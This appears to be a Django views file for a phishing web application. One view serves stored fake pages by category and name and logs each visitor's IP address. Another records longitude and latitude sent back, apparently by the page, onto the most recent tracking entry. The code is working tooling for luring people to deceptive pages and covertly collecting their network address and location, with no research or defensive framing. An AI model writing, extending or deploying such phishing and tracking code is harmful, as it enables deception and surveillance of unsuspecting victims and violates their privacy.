from django.shortcuts import render, get_object_or_404
from django.http import JsonResponse
from ipware import get_client_ip
from ipaddr import client_ip

# Create your views here.


from .models import (
    PhisingWeb, TrackRecord
)

def webPhising_view(request, cat, name):
    # ip, is_routable = get_client_ip(request, request_header_order=['X_FORWARDED_FOR', 'REMOTE_ADDR'])
    ip = client_ip(request)
    web_objs = get_object_or_404(PhisingWeb, cat_parse=cat, name_parse=name)

    TrackRecord.objects.create(
        web_load=web_objs, ip_host=ip
    )

    content = {
        'product': web_objs
    }
    return render(request, 'phiser/phiser_view.html', content)


def get_lonlat(request):
    long_v = request.GET.get('lo', None)
    lat_v = request.GET.get('la', None)

    traker_obj = TrackRecord.objects.latest('timestamp')
    traker_obj.long_t = long_v
    traker_obj.lat_t = lat_v
    traker_obj.save()

    return JsonResponse({'status': 1})

